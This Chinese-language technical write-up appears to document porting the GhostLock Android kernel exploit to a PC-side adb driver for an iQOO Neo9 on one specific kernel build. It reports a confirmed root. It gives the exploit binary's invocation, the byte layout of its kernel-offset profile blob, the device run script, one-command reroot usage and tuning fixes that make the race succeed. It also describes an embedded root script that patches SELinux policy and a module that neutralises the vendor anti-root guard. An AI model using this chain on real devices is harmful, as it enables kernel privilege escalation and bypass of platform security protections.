# GhostLock PC 化复现（不经 App / 不经 Shizuku）

> 注：文中出现的 `apkout/`、`java/`、`x/`、`t.apk` 是本地解包/分析目录，因版权原因**未随仓库分发**；
> 仓库里保留的是可复现的部分（脚本、blob、日志）。要重建 pack 请用你自己解包的 APK 产物。
>
> **原作者（酷安）**：<https://www.coolapk.com/U/43561117> ·《vivo iQOO Neo9 (PD2338) Root 研究》
> <https://www.coolapk.com/feed/74180094> · **GhostLock 原项目**：YuKongA/ghostlock-app
>
> 本仓库专用于 **iQOO Neo9（PD2338）+ OriginOS 6（"橘子 6"，16.2.13.2）+ 内核 5.15.197-g708015331567-dirty**；
> 仅供自有设备学习研究，详见 README 的《免责声明》。

对象：`GhostLock-v1.2-IQOO-Neo9(545)-arm64.apk`
sha256 = `9c85bd85cfe08db4891548574684256dbc33f751f392b4cfb2691d2226600a56`
本机副本：`ghostlock/t.apk`（2 868 118 B，逐字节相同）
设备侧目标：iQOO Neo9（PD2338 / SM8550），`uname -r` = `5.15.197-g708015331567-dirty`
（该 release 在 `assets/kernel_profiles/5.15.197-g708015331567-dirty.conf` 里有精确 offset）

---

## 0. 一句话结论

**不用改一行 exploit 代码就能搬出 App**：`lib/arm64-v8a/libghostlock.so` 本身是一个
PIE **可执行文件**（带 `INTERP=/system/bin/linker64` 和入口地址），App 只是它的调用方。
App 那一层做的事（Shizuku UserService → uid 2000 + Seccomp=0 的进程 → exec 它 → 喂 profile blob）
在 PC 上可以用 `adb shell` 原样替代，于是整条链路变成：

```
PC ──adb──> 设备 /data/local/tmp/ghostlock-app/
              libghostlock.so --load-prebuilt-profile profile.bin --force-attack   ← 实测走这条
            (等价入口) libghostlock.so --ghostlock-app-call
                        stdin = u32(BE)长度 + profile.bin                          ← App 用这条
```

进程落在 adb shell 的 session 里（不是应用进程、不在应用 cgroup），不再被 LMK /
app-freeze / 应用生命周期回收；PC 端只负责喂参数、实时取日志、失败了自动重来。
失败导致 panic → 设备自行重启恢复 → driver 等它回来继续下一轮。

**已经在真机上成功（2026-10-18）**：`su -c id` → `uid=0(root) context=u:r:ksu:s0`、
`/proc/modules` 有 `kernelsu`、SELinux 保持 Enforcing。完整过程见 §8，下次用的命令是
`./reroot.sh`。**关键约束：这是开机窗口竞争**（12~45 秒内最容易命中，>60 秒基本
`Write 1 failed`），所以 driver 的正确形态是"重启 → 抢窗口 → 盯 ksu 日志 → 命中即停"。

> 关键区别不是"把漏洞搬到电脑上跑"（futex-PI/rtmutex 竞态只能打手机内核），
> 而是**把 App 壳搬到电脑上**：漏洞进程仍然是手机上的原生进程，只是不再挂在应用里。

---

## 1. 为什么能这样搬（逐条证据）

### 1.1 libghostlock.so 是可执行文件，不是库

```
readelf -h  lib/arm64-v8a/libghostlock.so
  Type: DYN (Position-Independent Executable file)   Entry point: 0x2bb30
readelf -lW libghostlock.so
  INTERP  0x2e0  ... [Requesting program interpreter: /system/bin/linker64]
  FLAGS_1: NOW PIE
```
文件名 `.so` 只是为了放进 `lib/arm64-v8a/`（安装后落在 `nativeLibraryDir`、天然可执行）。
字符串里自带 CLI 说明（文件偏移 = 虚拟地址，第一节 LOAD 是 0 偏移映射）：

```
0x1573b  "\x1b[0musage: %s [--ghostlock-app-call | --load-prebuilt-profile <bin>]
          [--dump-kernel-log <dir>] [--force-attack] [--enable-status-record]"
0x15e68  "\x1b[0mno entrypoint: pass --ghostlock-app-call or --load-prebuilt-profile <bin>"
```

### 1.2 App 侧调用协议（这就是要"照着抄"的全部东西）

`java/sources/com/ghostlock/app/shizuku/GhostlockUserService.java`

| 行 | 事实 |
|---|---|
| 154-161 | 硬要求 `Process.myUid()==2000`（Shizuku UserService = shell uid）且 `/proc/self/status` 里 `Seccomp:\s*0`，否则直接抛异常 |
| 174 | 可执行文件 = `applicationInfo.nativeLibraryDir + "/libghostlock.so"` |
| 178 | 工作目录 = `/data/local/tmp/ghostlock-app`（强制 mkdirs） |
| 189-195 | `argv = [bin, "--ghostlock-app-call", "--enable-status-record"]`，再按需追加 `--force-attack` / `--dump-kernel-log <dir>` |
| 197-209 | `cwd=该目录`；`env: GHOSTLOCK_HOME / TMPDIR / HOME = 该目录`，`GHOSTLOCK_KSU_LOG = <dir>/ghostlock-ksu-<ms>.log` |
| 212-216 | **stdin**：先写 4 字节 big-endian 长度，再写整段 profile blob（`out.write(new byte[]{len>>24,len>>16,len>>8,len}); out.write(blob)`） |
| 77-145 | stdout 被重定向到 `<dir>/.ghostlock_native.log`，App 按行 tail；行首为 `\x1eGLK_STATUS` 的状态行会回写 `\x1eGLK_STATUS_ACK\n` 到 stdin |

`--enable-status-record` 只是给 App UI 用的进度回执：native 里明确写了
`"warning: status record ACK timeout; disabling status record for this run
(rerun without --enable-status-record)"`（0x16d81）以及
`"--enable-status-record requires --ghostlock-app-call"`（0x175b5）。所以 PC 侧**不传它**，
stdin 只需要那一帧 profile，不必维护 ACK 协议。

### 1.3 profile blob 的字节级格式（两侧 + 反汇编三方对齐）

生产者：`java/sources/defpackage/ea1.java`（`a()`，`putInt(0x0D000721)` 起）
消费者：`libghostlock.so` 内 `0x67dbc` 处的解析函数

```
0x67dec  ldr   w8, [x0]                  ; magic
0x67df0  mov   w9, #0x721                ; \
0x67df4  movk  w9, #0xd00, lsl #16       ; / w9 = 0x0D000721
0x67df8  cmp   w8, w9 ; b.ne  -> -1
0x67e00  ldrh  w8, [x0, #4]  ; cmp #2    ; version == 2
0x67e0c  ldrh  w22,[x0, #6]  ; (v-1)<=1  ; flag_a
0x67e1c  ldrh  w23,[x0, #8]  ; (v-1)<=1  ; flag_b
0x67e38  ldrb  w21,[x8, #0xa]            ; route_id  = lo | hi<<8
0x67e3c  ldrb  w9, [x8, #0xb]
0x67e44  cmp   w24,#0xff     ; b.hi     ; route_id <= 255
0x67e4c  ldrh  w19,[x8, #0xc]            ; release_len
0x67e50  cmp   x19,#0xff    ; b.hi      ; release_len <= 255  (注意: 比 Java 侧更严)
0x67e58  add   x9, x19, #0x10; cmp x9,x1 ; 总长必须 >= 16+release_len
0x67e64  add   x20, x8, #0x10            ; release 从 0x10 开始
0x67e84  bl    memcpy(dst, x20, x19)     ; 拷出 release 并补 NUL
...
0x67fd0  ldrh  w8, [x8]                  ; 组数（紧跟在 release 后面）
0x068014 add   x19, x27, #1              ; 跳过 u8 name_len
0x068020 ldrb  w20, [x27]                ; name_len
0x068028 add   x27, x8, #4               ; 跳过 u32 entry_count
0x068034 ldr   w8,  [x8]                 ; entry_count
0x068044 ldr   w8,  [x19]                ; 前 4 字节
0x068048 mov   w11, #0x6f72              ; "ro"
0x068050 movk  w11, #0x7475, lsl #16     ; "utro"
0x068054 cmp   w8,  w11                  ; \
0x068058 mov   w8,  #0x2e65              ;  / 比较 "route." 前缀
0x06805c ccmp  w10, w8, #0, eq           ; 仅接受当前 route_id 对应的 route.* 组
...
0x068130 add   x19, x27, #1              ; 跳过 u8 key_len
0x06813c ldrb  w20, [x27]                ; key_len
0x068144 add   x27, x8, #8               ; 跳过 i64 value
```

所以 blob 布局是：

| off | 类型 | 字段 | 约束 |
|---|---|---|---|
| 0x00 | u32 LE | magic | `0x0D000721` |
| 0x04 | u16 | version | `2` |
| 0x06 | u16 | flag_a | 1 或 2（Java 写 1） |
| 0x08 | u16 | flag_b | 1 或 2（Java 写 1） |
| 0x0a | u16 | route_id | 1=tcp_zerocopy, 2=select_stack, 3=multicast_waiter |
| 0x0c | u16 | release_len | **≤255**（native 限制） |
| 0x0e | u16 | reserved | 0（native 忽略） |
| 0x10 | bytes | release | 与设备 `uname -r` 逐字符一致 |
| … | u16 | group_count | |
| 每组 | u8 + name | 组名 | native 只认固定 15 个 + 当前 route 组 |
| 每组 | u32 | entry_count | |
| 每项 | u8 + key | 键名 | native 每组有固定白名单 |
| 每项 | i64 LE | 值 | |

### 1.4 native 侧的组名 / 键名白名单（从 `libghostlock.so` 数据段解析出来的）

组表在 `0x76608`，15 条 × 0x20（`{name_ptr, name_len, key_table_ptr, apply_fn}`）：

| # | 组名 | key 表地址 | 该组接受的 key |
|---|---|---|---|
| 0 | `meta` | 0x767e8 | kernel_major, recommend_shizuku, fallback_route, safe_mode, vr_guard |
| 1 | `task_struct` | 0x768b0 | prio, normal_prio, sched_task_group, pi_lock, pi_waiters, pi_top_task, pi_blocked_on, pid, tgid, atomic_flags, real_cred, cred, comm, tasks, seccomp |
| 2 | `cred` | 0x76b08 | copy_size, usage_offset, usage_value, caps_offset, caps_count, caps_value, ref_count, ref0..3_offset, ref0..3_image |
| 3 | `offset` | 0x76d60 | init_task, init_cred, empty_zero_page, root_task_group, selinux_enforcing, selinux_blob_sizes, security_hook_heads, slide_nfulnl_logger, slide_loggers_0_1, slide_boot_id, **vr_sys_exit_tp** |
| 4 | `kernel` | 0x76f18 | kernel_phys_load, kernel_phys_offset, compact_waiter, kernelsnitch_collisions, mm_struct_sz |
| 5 | `execution.recommended_cpus` | 0x76fe0 | main, consumer |
| 6 | `execution.heap` | 0x77030 | prepare_max_attempts, prepare_timeout_ms, kernelsnitch_timeout_ms |
| 7 | `execution.race` | 0x770a8 | route_wait_ms, route_done_timeout_ms, setup_settle_us, state_poll_interval_us |
| 8 | `execution.stages` | 0x77148 | w1_attempts, w1_settle_us, w1_scratch_repair_attempts, w2_attempts, w2_settle_us, w3_chain_rounds, w3_attempts, w3_settle_us |
| 9 | `execution.handoff` | 0x77288 | pre_dispatch_settle_ms, module_poll_attempts, module_poll_interval_ms, enforce_poll_attempts, enforce_poll_interval_ms |
| 10 | `execution.consumer` | 0x77350 | max_calls, burst_calls |
| 11 | `route.tcp_zerocopy` | 0x773a0 | attempts, arm_sequence, post_receive_hold_iterations |
| 12 | `route.select_stack` | 0x77418 | waiter_shift, compact_waiter, enter_delay_us, timeout_us |
| 13 | `route.multicast_waiter` | 0x774b8 | waiter_off, buffer_size, task_offset, lock_offset, attempts, arm_sequence, arm_hold |
| 14 | `vr_guard` | 0x775d0 | tracepoint_funcs |

（`route.*` 三组里只有与 header 里 `route_id` 匹配的那一组会被接收；未知组/未知 key 一律
静默丢弃，不报错——所以"发出去没生效"不会体现在日志里，必须按白名单生成。）

### 1.5 profile 由谁产出、怎么产出（Python 复刻）

App 的产出链：`assets/kernel_profiles/<uname -r>.conf`（HOCON）
→ `defpackage.c9.c()` 做字段映射 → `defpackage.ea1.a()` 序列化 → stdin。

Python 端 `scripts/ghostlock_profile.py` 逐字段复刻：
- 组顺序、组名、键名严格按上表；
- `execution.recommended_cpus` 取 `execution.selected_cpus.{main,consumer}` 覆盖后的值
  （`defpackage/k3.java:716` 的 recommended→selected 覆盖逻辑）；
- `execution.consumer.max_calls/burst_calls` 取 `execution.routes.<route>.consumer_*`，
  缺省 0（本设备 conf 没有该块 → 0，与 App 一致）；
- `compact_waiter` **只认顶层 key**（见 §5 第 2 条）；
- 生成完立刻用 `fm.C()` 的 Python 复刻回读，并按 §1.4 白名单校验，未知项直接报错退出。

本设备实测产物：

```
$ python3 scripts/ghostlock_profile.py build \
    -c apkout/assets/kernel_profiles/5.15.197-g708015331567-dirty.conf \
    -o profile.bin
wrote profile.bin  (1923 bytes)
  release   : 5.15.197-g708015331567-dirty
  route     : multicast_waiter (id=3) fallback=none
  groups    : 12
  note      : route.multicast_waiter.compact_waiter is inert in the App path ...

$ xxd profile.bin | head -2
00000000: 2107 000d 0200 0100 0100 0300 1c00 0000  !...............
00000010: 352e 3135 2e31 3937 2d67 3730 3830 3135  5.15.197-g708015...
```
`21 07 00 0d` = magic，`02 00` = version 2，`01 00 01 00` = flag a/b，
`03 00` = multicast_waiter，`1c 00` = release 长度 28，`00 00` = 保留，
`0x10` 起是 release，接着 `0c 00` = 12 个组。与 §1.3 的表逐字节对齐。

---

## 2. 复现步骤

前置：usb连接电脑、开启开发者选项:(停止限制子进程、去掉锁屏密码、去掉所有的锁屏、usb默认文件传输),调试环境上有 `adb`GhostLock App，
不需要 Shizuku、ghostlock。

```bash
cd ghostlock

# —— 下次最简单的方式（已验证）——
./reroot.sh              # 最多 10 轮：reboot → 一有 shell 就发射 → 命中即停
./reroot.sh --no-reboot  # 设备刚重启过 / 手动重启完：直接等 adb 然后打
./reroot.sh --check      # 只看当前状态，不会重启
./reroot.sh --inspect    # 看 payload 包里有什么

# —— 或者用 python 驱动（想调参/看细节时）——
python3 scripts/ghostlock_pc.py check                      # 体检 + release 一致性
python3 scripts/ghostlock_pc.py setup --from-blob evidence/profile.bin
python3 scripts/ghostlock_pc.py run --on-boot --reboot --reboots 8 \
        --per-boot 8 --window 150 --timeout 120 --poll 0.4
python3 scripts/ghostlock_pc.py status
```

> `setup` 默认走 **`--load-prebuilt-profile <file>`**（`--app-call` 才用 §1.2 的 stdin 帧）。
> `--from-blob evidence/profile.bin` 直接推那份**在真机上打通过**的 2058 B blob；
> 没有 `--from-blob` 时会从 `--conf` 现场生成——注意 §8.2 说的 `consumer.max_calls=0` 陷阱。

`setup` 推到设备的运行脚本长这样（`--dry-run` 可先看）：

```sh
H="/data/local/tmp/ghostlock-app"
cd "$H" || exit 90
TS=${GL_RUN_ID:-$(date +%s)}
export HOME="$H" TMPDIR="$H" GHOSTLOCK_HOME="$H"
export GHOSTLOCK_VRPATCH_KO="$H/vrpatch.ko"
export GHOSTLOCK_KSU_LOG="$H/ksu-$TS.log"
"$H/libghostlock.so" --load-prebuilt-profile "$H/profile.bin" --force-attack >> "$H/native-$TS.log" 2>&1
echo "=== native exit=$?" >> "$H/native-$TS.log"
echo done > "$H/native-$TS.rc"
```
`GL_RUN_ID` 由 PC 传入（保证 PC 知道日志文件名）；`setsid` 让它在 adb 断开后继续跑。

注意 `profile.len` 就是 4 字节 big-endian 长度文件，`cat profile.len profile.bin`
拼出来的字节流与 §1.2 里 Java 写进 stdin 的完全一致（本机 mock 端实测：
`stdin_bytes=1927 magic=2107000d declared=1923 actual=1923`）。

---

## 3. 和 App 路径的差异（有意为之，逐项）

| 项 | App | PC driver | 说明 |
|---|---|---|---|
| 执行进程 | Shizuku UserService（`app_process`，uid 2000，Seccomp=0） | `adb shell`（uid 2000，Seccomp 由 driver 实测并告警） | 同一个 uid/域，`getenforce`、perf、futex 能力一致 |
| 进程归属 | 应用相关进程/会话 | shell session + `setsid` 脱离 | 这是"不再被杀"的核心 |
| argv | `--ghostlock-app-call --enable-status-record` | `--load-prebuilt-profile profile.bin --force-attack`（**实测可用**）；`--app-call` 可切回 stdin 帧 | 两条 entrypoint 同一套解析器，见 §5.1 |
| stdin | 4B BE 长度 + blob | prebuilt 模式不读 stdin；app-call 模式逐字节相同 | 见 §1.2 / §2 |
| env | HOME/TMPDIR/GHOSTLOCK_HOME/GHOSTLOCK_KSU_LOG + `GHOSTLOCK_VRPATCH_KO` | 相同 | App 也是把 `assets/modules/vrpatch.ko` 复制成 `<dir>/vrpatch.ko` 并设同名 env（`defpackage/m7.java:3283-3287`, `1353-1360`），这里照抄 |
| profile | c9.c()+ea1 序列化 | `ghostlock_profile.py`（1:1 复刻 + 白名单校验）；实战用设备上那份 2058 B | 生成器能把 `.conf` 变 blob，但 multicast 路由必须 `consumer.max_calls≥1`，见 §8.2 |
| 重试 | 用户在 UI 里再点一次 | `--attempts N`，失败/重启后自动继续 | 失败即重启恢复，已按你的说明处理 |
| 入口 | app-call（stdin 帧） | 默认 `--load-prebuilt-profile`，`--app-call` 可切回 | 两条 entrypoint 走同一个解析器（`0x67dbc`） |

没有改动的部分：`vrpatch.ko`（249 224 B，原样推送）、root 脚本（由 native 自己写到
`$HOME/.ghostlock_root.sh`，内容来自二进制内嵌字符串）、SELinux policy patch、
`ksud insmod` / `late-load` 全部原样。

---

## 4. 边界与风险（按你给的口径）

1. **不动系统分区**：整条链只做「内核内存写 + 临时 cred 替换 + insmod/late-load」。
   root 脚本里对文件系统的动作只有：`$HOME(.ghostlock_*)`、`/sys/fs/selinux/{checkreqprot,enforce,policy,status}`、
   `/data/adb/**`（safe mode 时才动，本 profile `safe_mode=0`）、`/data/local/tmp/**`。
   没有任何对 `/system`、`/vendor`、`/boot` 的写入。
   （`__system_property`/`/proc/sys` 之外无系统分区写；`vrpatch.ko` 只 patch 内核内存里的
   vr.ko text，`cleanup_module` 也不回滚。）
2. **失败 = 重启恢复**：offset 不匹配或竞态打偏会 panic；`run` 检测到设备掉线就
   `wait-for-device` 等恢复后继续下一轮，不中断整批尝试。
3. **profile 必须逐字符匹配 `uname -r`**：`check` 会从 `profile.bin` 头部把 release 读出来
   和设备 `uname -r` 对比，不一致直接报错（并提示正确 conf 就在 assets 里）。
4. **不要用 multi-device**：`pick_device` 在多设备时会要求 `--serial`，避免打错机器。
5. **一次只跑一个 native**：`run` 会先看 `ps -A | grep libghostlock`，有残留就等它结束，
   不杀进程。
6. **adb 传输会偶发掉线**：实测出现过 `offline` → `unauthorized` → 几秒后自动恢复
   （USB 重新授权，不是设备重启；uptime 连续、root 仍在）。两个脚本都会等 `adb shell`
   真的能用再动手，所以遇到 `device offline` 直接重跑或等几秒即可。

---

## 5. 三个"对提权成功率有用"的实测结论

1. **`execution.consumer.max_calls = 0` 是致命的（这条比什么都重要）**。
   用 APK 里 `5.15.197-...conf` 原样生成的 blob，这一项是 0，真机日志是
   `multicast route status=2 ... attempts=128 calls=0 success=0` —— **consumer 一次都没触发**，
   路由 128 次全空转，紧接着 `W1: SELinux attempt 1 route failed; backing off`。
   换成 `1/1` 的 blob 立刻变成 `calls=1 success=1`。所以 multicast 路由下这个值必须 ≥1。

2. **`route.multicast_waiter.compact_waiter` 在 App 的 route 对象里是死的**。
   `defpackage/jt0.java` 只有 4 个几何字段，native 的 `route.multicast_waiter` 键表里也没有它
   （只有 `kernel` 组和 `route.select_stack` 组认）。但**打通过的那份 2058 B blob 的
   `kernel.compact_waiter = 1`**，所以最终配置里是带着它的；它单独是不是必需，没做隔离实验
   （和 `consumer=1` 是同一次改动）。

3. **CPU 绑定可以直接从 PC 改**（native 认 `GHOSTLOCK_MAIN_CPU` / `GHOSTLOCK_CONSUMER_CPU`）：
   `setup --main-cpu 6 --consumer-cpu 7`（SM8550 大核）或保持 profile 里的 3/4。
   实战用的是 3/4，没换过。

---

### 5.1 一个 App 侧的小坑（PC 侧已避开）

`.gl_ksu_pkg` / `.gl_kmi` 是给 root 脚本用的两个提示文件，脚本从
`$HOME_DIR/.gl_ksu_pkg`、`$HOME_DIR/.gl_kmi` 读（`HOME_DIR` = `GHOSTLOCK_HOME` =
`/data/local/tmp/ghostlock-app`）。但 App 把它们写进了自己的私有 `filesDir`
（`defpackage/vh0.java:98-99`），脚本读不到 → 实际总是落到脚本里的硬编码候选包名
和默认 `kmi=android13-5.15`。PC driver 直接把这两个文件写到 `$HOME_DIR` 下
（`setup --ksu-pkg ... --kmi ...`），读得到，对非 `me.weishu.kernelsu` 的管理器
（KSU-Next / SukiSU / SuperManager 等）更稳。

### 5.2 root 脚本里的两道硬门槛（决定"只是临时 root"还是"KSU 持久化"）

把 native 内嵌的那段 root 脚本整段抽出来（`0x12807` 起，7349 字节，`\n` 转义，
已存 `/tmp/ghostlock_root_script.sh` 便于对照）之后，流程是：

```
uid!=0 ? -> "temp su unavailable; aborting"  exit 1      # W2 没打中的话到此为止
( debug 终端 .gl_cmd/.gl_out 后台子 shell ) &
iomem 缓存 -> $HOME/.ghostlock_iomem
echo 0 > /sys/fs/selinux/checkreqprot
SAFE_MODE=1 ? 给 /data/adb/modules/*/ 放 disable : (本 profile SAFE_MODE=0，不动 /data/adb)
SELinux policy 修补：读 /sys/fs/selinux/policy，头必须是
  8c ff 7c f9 08 00 00 00 53 45 20 4c 69 6e 75 78，
  第 23 字节 |= 0xC0 -> load_policy -> 用 /sys/fs/selinux/status 的计数确认生效（最多 10 轮）
  失败 -> "fixup failed; SELinux left permissive"，**跳过 vrpatch 和 KSU**
ksud insmod vrpatch.ko            (KSU_ENFORCE=9 到此停)
ksud late-load --allow-shell --package-name $PKG --kmi $KMI，轮询 /proc/modules 50×100ms
KSU_ENFORCE=0 ? echo 0 > /sys/fs/selinux/enforce
```

两道门槛：
1. **W1 必须真的把 SELinux 变 permissive**，否则 policy 修补走不通，后面 KSU 阶段整段被跳过
   （此时只有临时 root，日志里是 `fixup failed; SELinux left permissive`）。
2. **`ksud` 要能被找到且 KMI 对得上**，否则 `late-load` 失败（`KernelSU module not loaded`）。

`scripts/ghostlock_pc.py run` 现在会在每轮结束时把日志里的这些关键行摘出来，直接给
阶段诊断（W1/W2/W3、policy、ksud、late-load 各自的结论），不用自己翻长日志。

---

## 6. 未确定项（实战后更新）

- **stdin 4 字节帧格式**：仍只有调用方（App）侧的逐行证据（§1.2）；native 侧没定位到
  "读 4 字节再 read 到 blob"的那两行。实战走的是 `--load-prebuilt-profile`（同解析器、
  已验证），所以这条不影响使用；要用 `--app-call` 时再看 native 是否报解析错误。
- ~~`execution.consumer.max_calls=0` 的语义~~ → **已确定**：0 会导致 `calls=0`，
  路由完全不触发（§5 第 1 条 / §8.2）。
- **native 侧 `vr_guard` 组 / `offset.vr_sys_exit_tp`**：App 的 writer 不产出，但工作配置里有；
  命中那次的日志确实执行了 `vr guard: neutralizing __tracepoint_sys_exit.funcs ...` 并成功
  （`sys_exit probe disabled`）。所以它在 vivo 设备上是**有用**的；是否"缺了也能成"未验证。
- **vr.ko 的厂商归属**：静态推断 + 作者帖子（"vivo 自带的反 root 卫兵，`vr 45056 [permanent]`，
  查 `euid==0` 且不在 `u:r:vrp:s0` 就 SIGABRT"）互相印证，可以认为已确证。
- **`compact_waiter` 单独的影响**：见 §5 第 2 条，未隔离。

---

## 7. 交付物

| 文件 | 说明 |
|---|---|
| `scripts/ghostlock_profile.py` | HOCON `.conf` → native 二进制 profile blob；内置 `fm.C()` 复刻回读 + native 白名单校验；`build` / `dump` 两个子命令 |
| `scripts/ghostlock_pc.py` | PC 驱动：`check` / `setup` / `run` / `status` / `pull-log` / `exec` / `shell` |
| `ghostlock-pc-port.md` | 本文（协议证据 + 复现步骤 + 边界） |
| `ghostlock-analysis.md` | 原有的静态分析报告（漏洞链、vrpatch.ko 反汇编、权限与网络） |
| `extracted/ghostlock_root_script.sh.tmpl` | 从 `libghostlock.so`（`0x12807`，7349 B）整段抽出的 root 脚本模板，`%s` 为 `HOME_DIR / LOG / DEBUG_DIR` 等占位符；用来对照 §5.2 的门槛与"是否动系统分区" |
| `scripts/README.md` | 命令行速查 |
| `reroot.sh` | **下次直接用这个**（放在 `ghostlock/` 根目录）：纯 bash + adb，自己从 `ghostlock.bin` 拆包、抢启动窗口、盯 ksu 日志、命中即停 |
| `ghostlock.bin` | **payload 包**（736 303 B）：`libghostlock.so` + `vrpatch.ko` + `profile.bin` + `release.txt`，容器格式见 `scripts/mkpack.py` |
| `scripts/mkpack.py` | 打/看包：`mkpack.py -o ../ghostlock.bin --lib … --ko … --blob ../evidence/profile.bin`；`mkpack.py --list ../ghostlock.bin` |
| `scripts/reroot.sh` | 兼容 shim，直接转调根目录的 `reroot.sh` |
| `evidence/profile.bin` | 真机打通过的那份 2058 B blob（`consumer=1/1`、`compact_waiter=1`、含 `vr_sys_exit_tp`）；`setup --from-blob` 就用它 |
| `evidence/ksu-1792264567-6-1.log` | 成功那轮的 root 脚本原始日志（policy fixup → vrpatch → late-load） |
| `evidence/native-1792264567-6-1.log` | 成功那轮的 native 原始日志（`boot_ms=40663` 起） |

验证状态：
- **真机（PD2338 / 5.15.197-g708015331567-dirty）已提权成功**，见 §8：`su -c id` →
  `uid=0(root) context=u:r:ksu:s0`、`/proc/modules` 有 `kernelsu`、SELinux 仍 Enforcing。
- 另有 mock adb + mock native 的离线自测（帧校验 `declared=1923 actual=1923`、
  日志增量回传、成功标记识别、`status`/`exec` 路径）。

---

## 8. 实战结果（2026-10-18，PD2338 / 5.15.197-g708015331567-dirty）

**成功。** 设备当前状态（`adb shell` 实测）：

```
$ su -c id
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
$ grep -i kernelsu /proc/modules
kernelsu 233472 2 - Live 0x0000000000000000 (OE)
$ cat /sys/fs/selinux/enforce
1                       # 仍是 Enforcing：靠 policy fixup + ksu 域拿的 root
```

root 脚本日志（`evidence/ksu-1792264567-6-1.log`，逐行都是设备上真实输出）：

```
[*] root script start uid=0 euid=0
[*] seccomp=Seccomp: 0 Seccomp_filters: 0
[*] manager=com.resukisu.resukisu kmi=android13-5.15
[*] ksud=/data/app/~~u48heSHrr4o9Cv5fEPoC_g==/com.resukisu.resukisu-.../lib/arm64/libksud.so
[*] fixup: attempt 1 -> policyload before=0 after=2 -> policy fixup rc=0
[*] Loaded kernel module: /data/local/tmp/ghostlock-app/vrpatch.ko  (exit=0)
[*] late-load pkg=com.resukisu.resukisu kmi=android13-5.15        (exit=0)
[+] KernelSU module loaded
[*] script done
```

### 8.1 命中那一次的关键参数

| 项 | 值 |
|---|---|
| `boot_ms` | 40663（开机 ≈41 s 时发射） |
| 发射时 `enforce` | **0**（前一轮已经把 W1 打掉了，没重启，所以下一轮直接跳过 W1） |
| profile | 设备上那份 2058 B（`consumer.max_calls=1`、`compact_waiter=1`、`vr_sys_exit_tp`） |
| 入口 | `libghostlock.so --load-prebuilt-profile profile.bin --force-attack` |
| 进程 | adb shell（uid 2000、`Seccomp: 0`、`u:r:shell:s0`） |

### 8.2 两个必须知道的坑（都是实测踩出来的）

1. **`execution.consumer.max_calls` 不能是 0。**
   用 APK 里 `5.15.197-...conf` 原样生成的 blob，`consumer.max_calls = 0`，
   日志里是 `multicast route ... attempts=128 calls=0 success=0`，
   紧接着 `W1: SELinux attempt 1 route failed; backing off` —— **consumer 一次都没触发**，
   路由 128 次全空转。设备上那份 2058 B 的 blob 是 `1/1`，日志才是
   `calls=1 success=1`。所以 multicast 路由下这个值必须 ≥1（App 侧大概是靠合并
   `execution-select-stack.conf` 才拿到 1）。
2. **完全是启动窗口的竞争。** 历史日志里 `boot_ms` 与结果的关系是干净的：

   | boot_ms | 结果 |
   |---|---|
   | 14 s / 41 s | W1 过 → 进 W2（41 s 那次直接拿到 root） |
   | 62 s / 84 s / 106 s / 178 s | `Write 1 failed` |
   | 12 min / 2.9 h / 22 h | `Write 1 failed` |

   撞不中时是 **panic → 自动重启恢复**（你说的那个行为），所以正确用法就是
   `--on-boot --reboot` 死循环：重启 → 一有 adb shell 立刻发射 → 窗口内连刷。

### 8.3 driver 在实战里改掉的两个 bug

- 发射回显超时被当成"失败" → 第一次其实已经拿到 root，却被下一轮的 `adb reboot` 毁掉了。
  现在：回显超时就先看日志文件在不在，在就继续盯。
- 成功信号改成盯 **root 脚本的 ksu 日志里的 `KernelSU module loaded`**，命中即 `cmd_status`
  核验并 **立即停手（不再 reboot）**。

### 8.4 复现命令（已验证，下次照这个）

```bash
# 下次一条命令就够：
./reroot.sh              # 最多 10 轮，命中即停
./reroot.sh --no-reboot  # 设备刚重启过：直接抢窗口
./reroot.sh --check      # 只看状态
./reroot.sh --deploy     # 只布署 payload，不打

# 想手动布署 / 调参时：
python3 scripts/ghostlock_pc.py setup --from-blob evidence/profile.bin --force-attack
python3 scripts/ghostlock_pc.py run --on-boot --reboot --reboots 8 \
        --per-boot 8 --window 150 --timeout 120 --poll 0.4
python3 scripts/ghostlock_pc.py status
```

`--from-blob evidence/profile.bin` 推的就是本次打通的那份 2058 B blob（已备份在工作区）。
**不要**用 `--conf` 现场生成再推——那条路会得到 `consumer.max_calls=0`（§8.2），真机上必定
`calls=0` 空转。

### 8.5 注意（持久性）

`vrpatch.ko` 的 insmod 和 `ksud late-load` 都是**只存在于内存**的：**重启即失效**，
下次开机要重跑同一套 campaign（这就是 late-load 的本质，没解 BL 锁就没法把 KSU 塞进内核）。
所以现在这台上：**别重启**；要用 root 就直接 `su`。

---

## 9. 与作者帖子（酷安《vivo iQOO Neo9 (PD2338) Root 研究》）的交叉核对

帖子核心结论与本次实测逐条吻合：

| 作者结论 | 本次实测 |
|---|---|
| GhostLock 在 16.2.13.2（内核 5.15.197）"单轮约 **43 秒**稳定提权" | 命中的那一轮 `boot_ms=40663`（≈40.6 s） |
| "全程 **SELinux 保持 Enforcing**，巡逻制度没被真正关掉" | 收尾时 `getenforce` = `Enforcing`，`su` 域 `u:r:ksu:s0` |
| W1 改 SELinux 状态字节 + **W1b 修复副作用**；W2 换 `cred`（含 `real_cred`）+ **W2b 预构建修复 `init_cred+8`**；W3 清 seccomp | 日志逐项对上：`W1b: private scratch repair`、`W2b: firing prebuilt init_cred+8 repair`、`W3: TIF_SECCOMP`；本次走的是 `W2` 直通 + `handoff` |
| vrpatch 必须用 **ksud insmod**（kallsyms 通道解未导出符号），写完回读 8 字节验证 | ksu 日志：`ksud=.../lib/ksud.so` → `Loaded kernel module: vrpatch.ko` → `exit=0` |
| vr.ko 的 tagA（`task->flags`）对 PD2338 **无效**，因为它只读 `cred->euid` 和 SELinux 上下文；tagB 会把进程写成僵尸，已改为显式 opt-in | native 里 `GHOSTLOCK_VR_TAG_B` 默认跳过、须显式设置；本次未启用 |
| **软重启**补丁存活，**硬重启**失效，需重部署一条命令 | 本报告 §8.5 的结论一致：late-load 只在内存里 |
| 命中率是概率，必要时"恢复出厂设置"可恢复命中率 | 本次也是多轮才中（第 2 轮成功，前 1 轮 panic） |

作者提到 `vrpatch` 的 patch 点与回读值（`00 00 80 52 c0 03 5f d6` = `mov w0,#0; ret`）与本项目
静态分析里从 `vrpatch.ko` 反汇编出来的 `0xd65f03c052800000` 完全一致（见
[`ghostlock-analysis.md`](ghostlock-analysis.md) §vrpatch.ko 反汇编）。

### 9.1 简化脚本

为了让下次不用记 python 驱动的那套参数，做成**两个文件**就能带走：

```
ghostlock/reroot.sh      脚本（纯 bash + adb，无 python 依赖）
